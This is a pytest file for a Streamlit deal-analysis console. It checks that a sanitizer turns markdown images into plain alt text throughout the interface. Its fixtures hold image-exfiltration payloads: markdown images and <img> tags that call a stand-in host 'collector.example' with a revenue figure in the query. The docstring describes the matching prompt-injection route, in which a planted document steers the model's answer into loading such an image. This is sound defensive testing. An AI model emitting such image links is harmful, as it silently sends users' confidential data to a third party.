"""
The Streamlit console shows no image from the API (Decision 96, console
follow-up).

Markdown renders images, and an image loads the moment it is shown: an answer
steered by a planted document can write `![](https://collector/?q=…)` and the
console that displays it sends the request, with no click. Decision 76 gave the
web console the policy — answers never need images, show the alt text — and
these tests hold the Streamlit console to it everywhere it renders text from
the API: the answer, claims, evidence quotes, the validator's notes, file
names and headings, the injection note, risk samples, upload notices, the
trace, the tie-out and the checklist. Through the real app (AppTest) where the
result is shown, and component by component where the data comes from other
routes.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

import pytest

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

pytest.importorskip("streamlit.testing.v1")

from app.markdown_safety import inert_markdown  # noqa: E402

APP_PATH = str(_PROJECT_ROOT / "app" / "streamlit_app.py")
DEAL = "aurora_vertex_2024"

# What markdown would still turn into an image, or HTML into an <img>: "!"
# directly before "[", or "<" before img or image, with an even number of
# backslashes (none included) in front. Written apart from the sanitizer.
LIVE = re.compile(r"(?<!\\)(?:\\\\)*(?:!\[|<(?:img|image)\b)", re.IGNORECASE)

COLLECTOR = "https://collector.example/c?d=452.8"
INLINE = f"![revenue chart]({COLLECTOR})"
TAG = f'<img src="{COLLECTOR}">'


# ==============================================================================
# The sanitizer
# ==============================================================================


@pytest.mark.parametrize(("text", "shown"), [
    (INLINE, "revenue chart"),
    (f"![]({COLLECTOR})", ""),
    (f'![chart]({COLLECTOR} "Quarterly chart")', "chart"),
    (f"![chart](<{COLLECTOR}>)", "chart"),
    (f"![a ![b]({COLLECTOR}) c]({COLLECTOR})", "a b c"),
    (f"See ![the [bracketed] chart]({COLLECTOR}) here.", "See the [bracketed] chart here."),
    (f"![logo][brand]\n\n[brand]: {COLLECTOR}", f"logo\n\n[brand]: {COLLECTOR}"),
    (f"![logo][]\n\n[logo]: {COLLECTOR}", f"logo\n\n[logo]: {COLLECTOR}"),
    (f"[![badge]({COLLECTOR})]({COLLECTOR})", f"[badge]({COLLECTOR})"),
])
def test_an_image_becomes_its_alt_text(text, shown):
    assert inert_markdown(text) == shown


@pytest.mark.parametrize(("text", "shown"), [
    # A shortcut reference is an image only if the label is defined: it is
    # kept as written and cannot start one.
    (f"![brand]\n\n[brand]: {COLLECTOR}", f"\\![brand]\n\n[brand]: {COLLECTOR}"),
    ("Wow![ never closed", "Wow\\![ never closed"),
    # Not an image across a blank line, which ends the paragraph.
    (f"![a\n\nb]({COLLECTOR})", f"\\![a\n\nb]({COLLECTOR})"),
    # Replacements that would put "!" next to "[": "!" + alt "[a]".
    (f"!![[a]]({COLLECTOR})", "\\![a]"),
    (TAG, f'\\<img src="{COLLECTOR}">'),
    (f"<IMG SRC={COLLECTOR}>", f"\\<IMG SRC={COLLECTOR}>"),
    (f"<image href={COLLECTOR}>", f"\\<image href={COLLECTOR}>"),
    (f"![x]({COLLECTOR}) then {TAG}", f'x then \\<img src="{COLLECTOR}">'),
])
def test_what_could_still_start_an_image_is_escaped(text, shown):
    assert inert_markdown(text) == shown
    assert not LIVE.search(inert_markdown(text))


@pytest.mark.parametrize("text", [
    r"\![not an image](u)",  # already escaped: a "!" then a link
    "<imgx> is no image tag; &lt;img src=x&gt; is escaped text; <span>kept</span>",
    "Revenue grew! [memo.pdf | p. 4] [a link](https://example.com/x) \\$452.8 million",
    "### 1. Direct Answer\n\n- **Revenue**: \\$452.8M [📄 a.pdf | p.1]\n\n| A | B |\n|---|---|\n| 1 | 2 |",
    "",
])
def test_ordinary_markdown_is_left_exactly_as_it_was(text):
    assert inert_markdown(text) == text


def test_an_escaped_backslash_does_not_escape_the_image():
    assert inert_markdown(f"\\\\{INLINE}") == "\\\\revenue chart"


def test_it_is_idempotent_and_takes_none():
    mixed = f"a {INLINE} b ![r] c {TAG} d ![x"
    once = inert_markdown(mixed)
    assert inert_markdown(once) == once and not LIVE.search(once)
    assert inert_markdown(None) == "" and inert_markdown(7) == "7"


def test_it_is_linear_on_hostile_nesting():
    deep = "![" * 5_000 + "x" + "](u)" * 5_000
    assert not LIVE.search(inert_markdown(deep))
    assert not LIVE.search(inert_markdown("![" * 20_000))


# ==============================================================================
# What the app renders
# ==============================================================================


def _rendered(at) -> list[tuple[str, str]]:
    """Every string sent to the browser as markdown: element bodies and every label."""
    bodies = {"markdown", "caption", "error", "warning", "info", "success", "title", "header",
              "subheader"}
    out = []
    for node in at._tree:
        label = getattr(node, "label", None)
        if isinstance(label, str):
            out.append((f"{node.type} label", label))
        if node.type in bodies and isinstance(node.value, str):
            out.append((node.type, node.value))
    return out


def _live(at) -> list[tuple[str, str]]:
    return [(kind, text) for kind, text in _rendered(at) if LIVE.search(text)]


CLAIM = {
    "claim": f"Revenue was $452.8 million. {INLINE}",
    "status": "unsupported", "method": "llm",
    "numbers": [{"raw": f"$452.8 million{INLINE}", "status": "grounded", "binding": "bound"}],
    "reason": f"The judge read {INLINE}",
    "evidence": f"Total revenue was $452.8 million {INLINE} {TAG}",
    "evidence_source": f"memo{INLINE}.txt", "evidence_page": 3,
    "evidence_section": f"Overview\n\n{INLINE}",
    "citation_mismatch": [{"figure": "$452.8 million", "found_in": [f"other{INLINE}.txt"]}],
    "cited_documents": [f"memo{INLINE}.txt"],
}
SUPPORTED = {**CLAIM, "status": "supported", "method": "numeric", "claim": f"Customers {INLINE} 1,240."}


def _result(**over) -> dict:
    body = {
        "answer": f"Total revenue was $452.8 million [memo.txt | p.3].\n\n{INLINE}\n\n"
                  f"![logo][brand]\n\n[brand]: {COLLECTOR}\n\n{TAG}",
        "query_type": "financial", "confidence_score": 0.5, "validation_status": "warning",
        "citations": [{"chunk_id": "c1", "source_file": f"memo{INLINE}.txt", "page_number": 3,
                       "section_heading": f"Overview\n\n{INLINE}", "is_current_version": False,
                       "content_type": "text", "is_redline": False, "superseded_by": f"doc{INLINE}"}],
        "hallucination_flags": [f"Not supported by the retrieved documents: {INLINE}"],
        "claim_checks": [CLAIM, SUPPORTED],
        "total_latency_ms": 1000.0, "session_id": "s", "rewrite_iterations": 1,
        "agent_trace": [
            {"agent": "query_intelligence", "model": "gemini/lite",
             "output": {"query_type": f"financial{INLINE}", "query_expansions": [INLINE]}},
            {"agent": "query_rewriter", "model": "gemini/lite", "iteration": 1, "rewritten_query": INLINE},
            {"agent": "quality_assessor", "score": 0.4, "method": INLINE},
            {"agent": "hallucination_validator", "validation_status": INLINE, "confidence_score": 0.5,
             "skipped": True, "reason": INLINE},
            {"agent": f"node{INLINE}"},
        ],
        "is_refusal": False, "context_quality_score": 0.8, "outcome": "answered",
        "request_id": "req-96",
        "injection_review": {
            "flagged_passages": [{"source_file": f"memo{INLINE}.txt", "page_number": 3,
                                  "section_heading": f"Fees {INLINE}", "signals": ["model_address"]}],
            "cited_flagged_passages": 1,
            "tainted_figures": [f"$452.8 million{INLINE}"],
        },
    }
    body.update(over)
    return body


def _app_with(result: dict):
    from streamlit.testing.v1 import AppTest

    at = AppTest.from_file(APP_PATH, default_timeout=60)
    at.query_params["deal_id"] = DEAL
    at.session_state["last_result"] = result
    at.session_state["last_result_deal"] = DEAL
    at.run()
    assert not at.exception, at.exception
    return at


def test_the_answer_shows_the_alt_text_and_no_image():
    at = _app_with(_result(answer=f"Net revenue for FY2023 was $452.8 million [memo.txt | p.3]. {INLINE}"))
    [answer] = [m.value for m in at.markdown if "Net revenue for FY2023" in m.value]
    assert "revenue chart" in answer
    assert COLLECTOR not in answer and not LIVE.search(answer)


def test_a_claim_its_evidence_and_its_notes_show_no_image():
    at = _app_with(_result())
    claims = [m.value for m in at.markdown if "Revenue was" in m.value or "Customers" in m.value]
    evidence = [m.value for m in at.markdown if m.value.startswith("> ")]
    assert claims and evidence
    for text in claims + evidence:
        assert not LIVE.search(text), text
    assert any("revenue chart" in text for text in claims)


def test_nothing_the_answer_view_renders_from_the_api_can_load_an_image():
    at = _app_with(_result())
    rendered = _rendered(at)
    assert len(rendered) > 30, "the result was not rendered"
    assert not _live(at)


def _run(script, **kwargs):
    from streamlit.testing.v1 import AppTest

    at = AppTest.from_function(script, kwargs=kwargs, default_timeout=60)
    at.run()
    assert not at.exception, at.exception
    return at


def test_the_risk_dashboard_shows_no_image():
    def script(signals):
        from app.components.risk_dashboard import render_risk_dashboard

        render_risk_dashboard(signals)

    at = _run(script, signals=[{
        "signal_type": "customer_concentration", "severity": "high",
        "source_file": f"memo{INLINE}.txt", "page_number": 3,
        "description": f'1 match(es) — e.g. "customers {INLINE} represent 12.0% of revenue"',
    }])
    assert any("customers revenue chart represent" in text for _, text in _rendered(at))
    assert not _live(at)


def test_the_version_browser_shows_no_image():
    def script(chain):
        from app.components.version_browser import render_version_browser

        render_version_browser(chain)

    at = _run(script, chain=[{
        "doc_id": "d" * 32, "filename": f"memo{INLINE}.txt", "document_category": f"legal{INLINE}",
        "chunks_created": 3, "version_label": "v1", "upload_date": "", "is_current_version": True,
        "supersedes_doc_id": "", "superseded_by": "", "has_redline": False,
        "instruction_like_passages": 1, "instruction_signals": ["model_address"],
    }])
    assert not _live(at)


def test_the_upload_report_shows_no_image():
    def script(result):
        from app.components.document_uploader import _describe_ingest, render_upload_results

        render_upload_results(_describe_ingest("memo![x](https_collector.example).txt", result))

    at = _run(script, result={
        "status": "partial", "chunks_created": 9, "document_category": "financial",
        "notices": [f"Sheet 'KPIs' {INLINE} is hidden in the workbook; it was indexed and is marked hidden"],
        "version_candidates": [{"doc_id": "d1", "source_file": f"older{INLINE}.txt", "relation": "newer"}],
        "injection_screen": {"flagged_passages": 1, "signals": ["model_address"],
                             "locations": [{"page_number": 2, "section_heading": INLINE,
                                            "signals": ["model_address"]}]},
    })
    assert not _live(at)


def test_the_tie_out_and_checklist_panels_stay_literal():
    """They escape every markdown character already (Decisions 92, 95): image syntax prints."""

    def script(tie_out, checklist):
        from app.components.checklist import render_checklist
        from app.components.tie_out import render_tie_out

        render_tie_out(tie_out)
        render_checklist(checklist)

    passage = {"text": f"The Company {INLINE} shall not assign.", "page_number": 2,
               "section_heading": f"Assignment {INLINE}", "chunk_id": "c", "score": 0.9}
    at = _run(
        script,
        tie_out={"deal_id": DEAL, "conflicts": [], "agreements": [], "truncated": True,
                 "truncation_reason": "time_budget", "documents_not_read": [f"memo{INLINE}.txt"],
                 "documents_read": 1, "documents_total": 2},
        checklist={"deal_id": DEAL, "items": [{"id": "anti_assignment", "label": "Anti-assignment",
                                               "question": f"Is assignment restricted? {INLINE}"}],
                   "rows": [{"doc_id": "d", "source_file": "contract.txt", "document_category": "legal",
                             "cells": [{"item_id": "anti_assignment", "status": "found", "passage": passage,
                                        "alternates": [passage]}]}],
                   "truncated": False, "documents_total": 1,
                   "documents_excluded": [{"source_file": f"deck{INLINE}.pdf", "document_category": "board"}],
                   "excluded_total": 1},
    )
    assert not _live(at)
